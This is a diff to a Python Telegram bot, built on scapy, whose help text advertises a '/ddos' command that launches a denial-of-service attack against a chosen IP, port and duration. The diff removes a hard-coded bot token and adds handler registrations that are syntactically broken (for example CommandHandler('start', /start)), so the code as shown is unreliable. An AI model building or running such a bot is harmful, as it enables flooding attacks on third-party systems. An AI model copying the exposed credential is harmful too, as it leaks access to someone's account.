@@ -4,6 +4,20 @@ import scapy.all as scapy
 import threading
 import time
 
+# Define a command handler function for the /start command
+def start(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text("Welcome! Use /help to see available commands.")
+
+# Define a command handler function for the /help command
+def help_command(update: Update, context: CallbackContext) -> None:
+    help_text = (
+        "/start - Start the bot\n"
+        "/help - Show this help message\n"
+        "/ddos <target_ip> <target_port> <duration> - Start a DDoS attack\n"
+        "/cancel - Cancel the DDoS attack"
+    )
+    update.message.reply_text(help_text)
+
 # Define a command handler function for DDoS attack
 def ddos_attack(update: Update, context: CallbackContext) -> None:
     # Get the target IP address, port, and duration from the user
@@ -72,16 +86,16 @@ def cancel_ddos(update: Update, context: CallbackContext) -> None:
 # Main function to set up the bot
 def main():
     # Replace 'YOUR_TOKEN' with your bot's token
-    updater = Updater("7709593848:AAEBbjP438T55M1EhgC-NyZe9tKGdUaPA3o")
+    updater = Updater("YOUR_TOKEN_HERE")  # Use your actual token
 
     # Get the dispatcher to register handlers
     dispatcher = updater.dispatcher
 
     # Register command handlers
-    dispatcher.add_handler(CommandHandler("/start", start))
-    dispatcher.add_handler(CommandHandler("/help", help_command))
-    dispatcher.add_handler(CommandHandler("/ddos", ddos_attack))
-    dispatcher.add_handler(CommandHandler("/cancel", cancel_ddos))
+    dispatcher.add_handler(CommandHandler("start", /start))
+    dispatcher.add_handler(CommandHandler("help", /help))
+    dispatcher.add_handler(CommandHandler("ddos", /ddos))
+    dispatcher.add_handler(CommandHandler("cancel", /cancel))
 
     # Start the Bot
     updater.start_polling()
